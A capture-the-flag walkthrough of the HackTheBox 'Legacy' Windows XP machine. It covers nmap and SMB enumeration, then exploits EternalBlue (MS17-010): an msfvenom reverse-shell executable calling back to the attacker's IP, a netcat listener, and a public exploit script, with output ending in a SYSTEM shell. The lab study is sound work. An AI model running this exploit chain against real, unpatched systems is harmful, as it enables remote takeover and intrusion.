---
description: 10.10.10.4
---

# Legacy

![](<../../.gitbook/assets/1 (1).JPG>)

| **Machine Name** | Legacy  |
| ---------------- | ------- |
| Difficulty       | Easy    |
| Type             | Windows |

## Overview

The following exploits are covered for obtaining the flags on this target:

* CVE-2017-0143 - Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

## Enumeration

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.4 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 11:41 EDT
Nmap scan report for 10.10.10.4
Host is up (0.020s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 112.84 seconds
```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sC -sV -A -p139,445,3389 10.10.10.4 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 11:43 EDT
NSE: DEPRECATION WARNING: bin.lua is deprecated. Please use Lua 5.3 string.pack
Nmap scan report for 10.10.10.4
Host is up (0.019s latency).

PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:82:05 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-09-06T20:42:00+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   16.44 ms 10.10.14.1
2   20.49 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.81 seconds

```

We have three open ports, and based on the output from nmap, the target is running Windows XP.

### SMB

#### smbmap

Let's run smbmap to see if there are any shares accesible to us:

```
└─$ smbmap -H 10.10.10.4
[+] IP: 10.10.10.4:445  Name: 10.10.10.4 

```

#### smbclient

Next, we'll try smbclient:

```
└─$ smbclient -L \\10.10.10.4                   
Enter WORKGROUP\kali's password: 
session setup failed: NT_STATUS_INVALID_PARAMETER

```

**rpcclient**

Finally, let's try rpcclient:

```
└─$ rpcclient -U "" -N 10.10.10.4
rpcclient $> querydispinfo
Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

It appears that we do not have access to connect and interact with the SMB service via anonymous connectivity.

#### nmap script

Let's use the nmap scripting engine. Details about this very powerful feature is available at the link below and it is highly recommended that you become very familiar with it:

{% embed url="https://nmap.org/book/nse.html" %}

There are a lot of nmap SMB scripts, as shown below.

```
└─$ locate *.nse | grep smb
/usr/share/nmap/scripts/smb-brute.nse
/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
/usr/share/nmap/scripts/smb-enum-domains.nse
/usr/share/nmap/scripts/smb-enum-groups.nse
/usr/share/nmap/scripts/smb-enum-processes.nse
/usr/share/nmap/scripts/smb-enum-services.nse
/usr/share/nmap/scripts/smb-enum-sessions.nse
/usr/share/nmap/scripts/smb-enum-shares.nse
/usr/share/nmap/scripts/smb-enum-users.nse
/usr/share/nmap/scripts/smb-flood.nse
/usr/share/nmap/scripts/smb-ls.nse
/usr/share/nmap/scripts/smb-mbenum.nse
/usr/share/nmap/scripts/smb-os-discovery.nse
/usr/share/nmap/scripts/smb-print-text.nse
/usr/share/nmap/scripts/smb-protocols.nse
/usr/share/nmap/scripts/smb-psexec.nse
/usr/share/nmap/scripts/smb-security-mode.nse
/usr/share/nmap/scripts/smb-server-stats.nse
/usr/share/nmap/scripts/smb-system-info.nse
/usr/share/nmap/scripts/smb-vuln-conficker.nse
/usr/share/nmap/scripts/smb-vuln-cve-2017-7494.nse
/usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
/usr/share/nmap/scripts/smb-vuln-ms06-025.nse
/usr/share/nmap/scripts/smb-vuln-ms07-029.nse
/usr/share/nmap/scripts/smb-vuln-ms08-067.nse
/usr/share/nmap/scripts/smb-vuln-ms10-054.nse
/usr/share/nmap/scripts/smb-vuln-ms10-061.nse
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse
/usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
/usr/share/nmap/scripts/smb-vuln-webexec.nse
/usr/share/nmap/scripts/smb-webexec-exploit.nse
/usr/share/nmap/scripts/smb2-capabilities.nse
/usr/share/nmap/scripts/smb2-security-mode.nse
/usr/share/nmap/scripts/smb2-time.nse
/usr/share/nmap/scripts/smb2-vuln-uptime.nse
```

We want to exclude a couple of these as they take a long time to run, and are not required for our purposes, which is to enumerate the target. In order to do this, we can use some command logic built into nmap as follows:

```
└─$ sudo nmap --script "(smb*) and not (smb-flood or smb-brute)" -p139,445 10.10.10.4 -n -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-01 12:16 EDT
Nmap scan report for 10.10.10.4
Host is up (0.016s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.4\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
|_smb-mbenum: ERROR: Script execution failed (use -d to debug)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-09-06T21:14:22+03:00
|_smb-print-text: false
| smb-protocols: 
|   dialects: 
|_    NT LM 0.12 (SMBv1) [dangerous, but default]
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 64.48 seconds
```

This gives us a lot more to work with. In this case, the scripts have highlighted two potential vulnerabilities on the target, ms08-067 and ms17-010. Based on the information provided, the ms08-067 exploit requires XP SP2/SP3, and since we don't know the specific service pack installed on the target, this option is less suitable at this stage. The ms17-010 exploit however, specificall targets the SMBv1 service, which we know is running on the target.

## MS17-010

There are a lot of resources that relate to this bug as it affects many versions of Windows. In this case, I am using the exploit available at the following link:

{% embed url="https://github.com/helviojunior/MS17-010" %}

In order to use this exploit, we need two things, a named pipe on the target, and a reverse shell executable.

To get the available named pipes, we can run the checker.py script from the repo:

```
└─$ python3 checker.py 10.10.10.4 445                                                     
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
browser: Ok (32 bit)
spoolss: Ok (32 bit)
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED

```

To generate the reverse shell executable, we can use msfvenom (see Msfvenom Cheat Sheet for more details), which is part of Metasploit.

```
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8003 -f exe > exploit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
                                                                                                                 
└─$ file exploit.exe                                        
exploit.exe: PE32 executable (GUI) Intel 80386, for MS Windows

```

## Gaining Access

We need to start a netcat listener on the port we specified in the msfvenom command.&#x20;

```
└─$ nc -nvlp 8003
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8003
Ncat: Listening on 0.0.0.0:8003

```

Finally, we send the file using the send\_and\_execute.py script from the above repo.

```
└─$ python2 send_and_execute.py 10.10.10.4 exploit.exe spoolss                                               1 ⨯
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81aaab30
SESSION: 0xe12b9c18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe14e8b50
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe14e8bf0
overwriting token UserAndGroups
Sending file O438VQ.exe...
Opening SVCManager on 10.10.10.4.....
Creating service mBjD.....
Starting service mBjD.....

```

> NOTE: The NETBIOS connection will timeout, but this should not affect the reverse shell.

Back in the netcat listener, we have a shell as system.

```
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1031.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

This is a somewhat limited shell, but unlike with \*nix systems, it is not upgradable directly. For our purposes the shell is fine. We can navigate to the user and administrator's desktop folders and grab both the user and root flags.

## Summary

This is a fairly straight forward box and is a great box to learn about EternalBlue. It can be very easily exploited with Metasploits EternalBlue module, however, with a little bit of finessing were are able to exploit the target using a python script. EternalBlue was developed by the NSA and leaked into the public domain by the Shadow Brokers. Shortly after it's release it was used as part of the Wannacry ransomware program which caused havoc on systems in organisations such as the NHS in the UK and many others.

For more information regarding EternalBlue check out the following links:

{% embed url="https://en.wikipedia.org/wiki/EternalBlue" %}

{% embed url="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack" %}



